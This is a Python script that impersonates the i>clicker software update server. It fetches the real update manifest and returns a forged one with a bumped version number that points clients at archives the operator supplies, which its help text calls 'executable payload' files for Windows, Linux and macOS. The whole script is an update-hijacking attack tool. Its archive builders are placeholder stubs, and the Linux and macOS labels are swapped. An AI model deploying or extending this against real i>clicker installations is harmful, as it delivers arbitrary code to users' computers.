#!/usr/bin/env python3
"""Emulate the i>clicker update server."""
import argparse
from datetime import date
import hashlib
import http.server
import io
import logging
import os
import re
import shutil
import sys
import tarfile
import urllib.request
from xml.etree import ElementTree
from xml.etree.ElementTree import Element
import zipfile


REAL_HOST = "http://update.iclickergo.com"
PATH_REGEX = re.compile(r"^/ic7files/iclicker/QA/iclicker-QA-\d+\.xml(\?.*)?$")

WINDOWS_UPDATE_PATH = "/ic7files/iclicker/QA/update-iclicker-win.zip"
LINUX_UPDATE_PATH = "/ic7files/iclicker/QA/update-iclicker-linux.zip"
MACOS_UPDATE_PATH = "/ic7files/iclicker/QA/update-iclicker-mac.zip"


class ArgumentError(Exception):
    """Indicates that an error occurred because we were given bad input."""
    pass


def create_request_handler(archives):
    """Because http.server is stupid."""

    class RequestHandler(http.server.BaseHTTPRequestHandler):
        """Generates forged i>clicker update server responses."""
        def do_GET(self):
            """Handle a GET request."""
            if PATH_REGEX.match(self.path):
                try:
                    with urllib.request.urlopen(REAL_HOST + self.path) as rsp:
                        real = ElementTree.fromstring(rsp.read())
                except Exception:
                    logging.exception("Failed to forward request")
                    self.send_error(http.HTTPStatus.INTERNAL_SERVER_ERROR)
                else:
                    version = real.get("forVersion")
                    revision = real.get("forDevRevision")

                    int_version = [int(c) for c in version.split('.')]
                    int_revision = int(revision)

                    int_version[-1] += 1
                    forged_version = '.'.join([str(i) for i in int_version])
                    forged_revision = str(int_revision + 1)

                    def with_text(tag, text):
                        elem = Element(tag)
                        elem.text = text
                        return elem

                    root = Element(
                        "mergedHistory",
                        {
                            "branch": "QA",
                            "forDevRevision": revision,
                            "forVersion": version,
                            "latestDevRevision": forged_revision,
                            "latestVersion": forged_version
                        }
                    )

                    desc = Element("description")
                    root.append(desc)

                    desc.append(with_text("framework", "i>clicker"))
                    desc.append(with_text("devRevision", forged_revision))
                    desc.append(with_text("version", forged_version))
                    desc.append(with_text("date", date.today().isoformat()))

                    update = Element("update")
                    desc.append(update)

                    for path, (_, ostype, fobj) in archives.items():
                        fobj.seek(0, os.SEEK_SET)
                        md5sum = hashlib.md5(fobj.read()).hexdigest()
                        flen = fobj.tell()

                        url = Element(
                            "url",
                            {
                                "available": "1",
                                "md5sum": md5sum,
                                "os": ostype,
                                "packageSizekB": str(flen // 1000),
                                "sizekB": str(flen // 1000)
                            }
                        )
                        url.text = REAL_HOST + path

                        update.append(url)

                    data = ElementTree.tostring(root, encoding='utf-8')
                    self.send_response(http.HTTPStatus.OK)
                    self.send_header("Content-Type", "text/xml")
                    self.send_header("Content-Length", str(len(data)))
                    self.end_headers()
                    self.wfile.write(data)
            else:
                try:
                    ctype, _, fobj = archives[self.path]
                except KeyError:
                    self.send_error(http.HTTPStatus.NOT_FOUND)
                else:
                    self.send_response(http.HTTPStatus.OK)
                    self.send_header("Content-Type", ctype)
                    flen = fobj.seek(0, os.SEEK_END)
                    self.send_header("Content-Length", str(flen))
                    self.end_headers()

                    fobj.seek(0, os.SEEK_SET)
                    shutil.copyfileobj(fobj, self.wfile)

    return RequestHandler


def valid_port(string):
    """argparse type which parses a port number."""
    try:
        value = int(string)
    except ValueError:
        raise argparse.ArgumentTypeError("port must be an integer")

    if value < 1 or value > 65535:
        raise argparse.ArgumentTypeError("port must be in the range 1-65535")

    return value


def parse_args():
    """Validate and process command-line arguments using argparse."""
    parser = argparse.ArgumentParser(
        description="Emulate the i>clicker update server.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )

    parser.add_argument(
        "-p", "--port", type=valid_port, default=80, help="port to listen on"
    )
    parser.add_argument(
        "-H", "--host", default="127.0.0.1", help="address to bind to"
    )

    parser.add_argument(
        "-W", "--windows", type=argparse.FileType('rb'),
        help="executable payload for Windows"
    )
    parser.add_argument(
        "-L", "--linux", type=argparse.FileType('rb'),
        help="executable payload for Linux"
    )
    parser.add_argument(
        "-M", "--macos", type=argparse.FileType('rb'),
        help="executable payload for macOS"
    )

    return parser.parse_args()


def gen_windows_archive(payload):
    return ("application/zip", 'win', io.BytesIO(b'windows'))


def gen_linux_archive(payload):
    return ("application/x-gzip", 'mac', io.BytesIO(b'linux'))


def gen_macos_archive(payload):
    return ("application/x-gzip", 'linux', io.BytesIO(b'mac'))


def main():
    """Command-line entry point."""
    args = parse_args()

    archives = {}

    if args.windows is not None:
        archives[WINDOWS_UPDATE_PATH] = gen_windows_archive(args.windows)

    if args.linux is not None:
        archives[LINUX_UPDATE_PATH] = gen_linux_archive(args.linux)

    if args.macos is not None:
        archives[MACOS_UPDATE_PATH] = gen_macos_archive(args.macos)

    try:
        server = http.server.HTTPServer(
            (args.host, args.port),
            create_request_handler(archives)
        )
        server.serve_forever()
    except OSError as err:
        raise ArgumentError("Failed to start server: {}".format(err.strerror))


if __name__ == "__main__":
    try:
        main()
    except ArgumentError as err:
        print(
            "{}: {}".format(os.path.basename(sys.argv[0]), err.args[0]),
            file=sys.stderr
        )
        sys.exit(1)
    except KeyboardInterrupt:
        pass
